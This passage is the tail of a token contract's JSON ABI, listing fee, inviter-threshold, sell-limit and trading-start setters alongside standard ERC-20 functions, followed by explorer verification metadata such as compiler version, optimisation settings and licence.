"name\":\"remainHolder\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_token\",\"type\":\"address\"}],\"name\":\"removeERC20\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setAirdropNumbs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setBeInvitorThreshold\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setCantsellButTransferAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setCountAddedBNBValueThreshold\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setCustom_inviterCountToSellThreshold\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"excluded\",\"type\":\"bool\"}],\"name\":\"setFeeExclude\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setInviterBuyBNBAmountToSellThreshold\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setInviterCountToSellThreshold\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setInviterFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address payable\",\"name\":\"newMKT\",\"type\":\"address\"}],\"name\":\"setNewMktWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setOverThresholdSellFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"accounts\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"excluded\",\"type\":\"bool\"}],\"name\":\"setPrivateAddresses\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setSwapAtAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setcustom_inviterBuyBNBAmountToSellThreshold\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"newValue\",\"type\":\"uint256\"}],\"name\":\"setmake_invitor_pending_block\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"adrs\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"s\",\"type\":\"bool\"}],\"name\":\"startTrade\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"startTradeBlock\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"transferOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "Token", "CompilerVersion": "v0.8.17+commit.8df45f5f", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://2a3a3c48d15a6dd2e8cb9509a46b1fd72f3a12dde893a4f7918608220d1232a4"}